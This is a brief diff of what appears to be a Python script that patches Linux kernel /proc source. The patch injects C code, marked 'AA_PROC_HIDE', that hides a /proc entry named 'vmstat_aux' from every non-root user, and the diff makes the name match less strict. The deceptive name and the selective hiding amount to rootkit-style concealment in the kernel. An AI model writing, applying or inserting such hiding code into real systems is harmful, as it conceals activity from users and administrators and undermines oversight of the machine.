@@ -8,7 +8,7 @@ else:
     anchor = T + "do {" + chr(10) + T + T + "struct proc_dir_entry *next;" + chr(10) + T + T + "pde_get(de);"
     repl = (T + "do {" + chr(10) + T + T + "struct proc_dir_entry *next;" + chr(10)
             + T + T + "/* AA_PROC_HIDE */" + chr(10)
-            + T + T + 'if (de->namelen == 11 && !strcmp(de->name, "vmstat_aux") &&' + chr(10)
+            + T + T + 'if (!strcmp(de->name, "vmstat_aux") &&' + chr(10)
             + T + T + T + "!uid_eq(current_euid(), GLOBAL_ROOT_UID)) {" + chr(10)
             + T + T + T + "next = pde_subdir_next(de);" + chr(10)
             + T + T + T + "if (!next) { read_unlock(&proc_subdir_lock); return 1; }" + chr(10)
